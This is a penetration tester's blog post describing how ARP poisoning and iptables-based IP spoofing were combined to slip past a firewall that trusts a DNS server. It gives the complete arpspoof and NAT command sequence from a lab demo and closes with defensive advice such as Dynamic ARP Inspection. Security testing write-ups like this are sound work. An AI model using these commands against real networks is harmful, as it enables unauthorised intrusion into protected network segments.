---
layout: post
date:   2019-10-28 20:00:00 +0200
categories: pentest
description: "A specific case of bypassing a firewall"
title:  "Combining ARP poisoning and IP spoofing to bypass firewalls"
---
# Introduction
Recently a colleague of mine and I had to test if there was a way to gain access to a specific network segment (let's call it SecNet) from another network (BadNet). Of course the most basic attempts with ping and port scanning failed, because the firewall blocked everything that came from our segment, so we had to find a way to bypass the firewall. 

One of the devices available in BadNet was a DNS server and this server was configured as the primary DNS in the DHCP settings. We also confirmed that other networks also used this server as their DNS, thus our hypothesis was that maybe the devices from SecNet also used the same server as their DNS. If that was the case and the firewall wasn't configured to be restrictive enough, then the DNS server should have access to the SecNet network.

To confirm this we used ARP poisoning attack to do a man-in-the-middle (MITM) between the DNS and the gateway to see if traffic from SecNet reaches the DNS in BadNet.  
It did. 

Then we had to find a way to exploit this in order to reach SecNet. If we only spoofed our IP address, the return traffic would've been routed to the DNS server and we wouldn't be able to receieve it. If we poisoned the ARP table of the gateway and pretended that our host was the DNS server, then the hosts from other networks wouldn't be able to reach it and with this we would introduce a denial of service, which was not acceptable. Exploiting the server was out of scope. The only solution was to spoof our IP while simultaneously doing MITM as this would give us the opportunity to receive the return traffic of the spoofed requests. 

Because we faced some problems implementing such attack and Google wasn't helpful in finding solutions to those problems, I decided to explain what we did in this blog post.

Disclaimer:  
The technique for marking the spoofed packets is not my idea. I think I saw it in a tool for bypassing 802.1x, but I can't remember which one.

# Network Topology
The network topology of my virtualized environment for the demonstration.

SecNet: 172.16.3.0/24  
SecNet Sensitive Host: 172.16.3.10  
BadNet: 172.16.2.0/24  
BadNet DNS server: 172.16.2.10  
BadNet Hacker: 172.16.2.20  
Firewall: 172.16.2.2  
Firewall: 172.16.3.2   

![net_diag_1.png](/images/firewall_bypass/net_diag_1.png)  

In this environment the firewall is a Linux VM with a simple iptables rule which drops everything except traffic to and from the DNS server (172.16.2.10). 
Let's test it with a simple ping:  
![ping_test.PNG](/images/firewall_bypass/ping_test.PNG)

# The Attack
There are many guides which explain how to achieve MITM with ARP poisoning, so I won't spend much time on this.
One of the first things you should do is enable routing on your host, otherwise the packets won't be redirected to the victim.
This is easily achieved with the following command:

```bash
sysctl net.ipv4.ip_forward=1
```

For the actual ARP poisoning I used the arpspoof tool:
```bash
arpspoof -i eth0 -t 172.16.2.10 -r 172.16.2.2

# -i Interface
# -t Target IP
# -r Gateway IP
```

With this we've achieved MITM. The diagram below shows how the traffic flows from source to destination:  
![net_diag_2.png](/images/firewall_bypass/net_diag_2.png)

Right now if we spoof our IP and try to access SecNet the return traffic will be routed back to the DNS server which in turn will respond with TCP RST and terminate the session. This behavior is shown below:  
![net_diag_3.png](/images/firewall_bypass/net_diag_3.png)

To solve this problem we need to
* Tag our spoofed traffic somehow
* Don't route the response of the tagged (spoofed) traffic
* Accept the tagged traffic as if it was destined to the attacker's host

To tag the spoofed packets we could use the source tcp ports. Windows and Linux use specific port ranges for the source ports when initiating a new connection.
For Windows this can be found with the command:
```
netsh int ipv4 show dynamicport tcp
```

On my windows 10 machine the output from the above command is:
```
Protocol tcp Dynamic Port Range
---------------------------------
Start Port      : 49152
Number of Ports : 16384
```

Which means that in Windows 10 the source port range is 49152 - 65536.


On linux you can check with:
```bash
sysctl net.ipv4.ip_local_port_range
```

On my Kali the result is:
```
net.ipv4.ip_local_port_range = 32768	60999
```

We can use source ports from a range which is not used by our target to tag our spoofed traffic. If it's a windows host, we can use ports outside the range 49152 - 65536 and if it's a Linux host - source ports outside the 32768 - 60999 range,

If we don't know the OS of the target, we can use a source port range different than the combination of both ranges. In this demonstration I'll assume that we don't know the OS of the target.

1. The IP spoofing of the outgoing packets can be done with iptables and a NAT rule. The NAT rule would also change the source port range.  
2. Another NAT rule would look for a specific destination IP and destination port range in order to identify the incoming packets which are in response to the spoofed traffic. The destination IP will be changed to the local IP of the interface and the port range will be restored. That way the response to our spoofed traffic will be routed to the local host.  


The diagram below shows how traffic is handled by the interface in this configuration:  
![netfilter.png](/images/firewall_bypass/netfilter.png)

And the result would be:  
![net_diag_4.png](/images/firewall_bypass/net_diag_4.png)

To implement the tagging we need to choose the source port range first. Because I assume the OS of the target is unknown, then the ports should differ from both the Windows and Linux ranges. I chose to use 20000 - 30000.
Because this range has different size (10000) than the port range of my Kali (28231) I wasn't sure if this could lead to problems, so I also changed the source port range of the attacker host from 32768 - 60999 to 40000 - 50000.

The following commands are everything you need to accomplish all of this.
```bash
# Enable routing
sysctl net.ipv4.ip_forward=1

# Change the source port range of the attacker host
echo "40000 50000" > /proc/sys/net/ipv4/ip_local_port_range

# The outgoing packets sourced by the attacker's host (their source 
# IP is 172.16.2.20) have their source IP changed to the target 
# IP (172.16.2.10) and the source port range moved to another range.
# 
# This basically tags the outgoing traffic by spoofing the IP 
# and modifying the source ports.
iptables -t nat -A POSTROUTING -s 172.16.2.20/32 -o eth0 -p tcp -j SNAT --to-source 172.16.2.10:20000-30000

# Incoming traffic which has the target host as it's destination (172.16.2.10)
# and has destination port in the range of 20000:30000 is changed to the 
# attacker IP (172.16.2.20) and the port range is restored to 40000:50000.
# 
# This basically identifies the response of the spoofed traffic and changes
# it in order to be routed to the attacker's host.
iptables -t nat -A PREROUTING -d 172.16.2.10/32 -i eth0 -p tcp -m tcp --dport 20000:30000 -j DNAT --to-destination 172.16.2.20:40000-50000

# Start the MITM attack
sudo arpspoof -i eth0 -t 172.16.2.10 -r 172.16.2.2
```

Now when we test the connection to the host in the SecNet segment, a successful TCP session is established:  
![arpspoof_test.PNG](/images/firewall_bypass/arpspoof_test.PNG)

The firewall is successfully bypassed! This means it's possible to launch port scans and interact with the services in the SecNet segment!

Some recommendations to prevent such attacks are:
* Use Dynamic ARP Inspection to protect from arp poisoning
* Use IP Source Guard to prevent IP spoofing
* Harden your firewall rules and permit only the necessary ports on your firewalls

# References:
[1] [https://superuser.com/questions/1118735/how-are-source-ports-determined-and-how-can-i-force-it-to-use-a-specific-port](https://superuser.com/questions/1118735/how-are-source-ports-determined-and-how-can-i-force-it-to-use-a-specific-port)
